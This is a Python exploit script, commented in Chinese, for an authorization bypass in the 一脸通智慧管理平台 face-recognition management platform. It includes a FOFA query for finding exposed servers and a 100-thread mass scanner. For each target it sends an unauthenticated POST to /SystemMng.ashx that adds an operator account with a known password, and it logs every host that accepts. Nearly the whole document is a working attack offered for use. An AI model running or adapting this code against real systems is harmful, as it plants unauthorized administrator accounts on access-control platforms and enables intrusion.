# 一脸通智慧管理平台权限绕过漏洞

#fofa语法：title="欢迎使用脸爱云 一脸通智慧管理平台"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
        _  __               _                    
       (_)/ _|             | |                   
  _   _ _| |_ __ _  ___ ___| |_ ___  _ __   __ _ 
 | | | | |  _/ _` |/ __/ _ \ __/ _ \| '_ \ / _` |
 | |_| | | || (_| | (_|  __/ || (_) | | | | (_| |
  \__, |_|_| \__,_|\___\___|\__\___/|_| |_|\__, |
   __/ |                                    __/ |
  |___/                                    |___/                                                                                     
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="一脸通智慧管理平台")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/SystemMng.ashx'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'close',
        'Accept-Language': 'en',
        'Content-Length': '174'
    }
    data =  "operatorName=test123456&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200:
            print(f"f[+]该url存在权限绕过漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在权限绕过漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()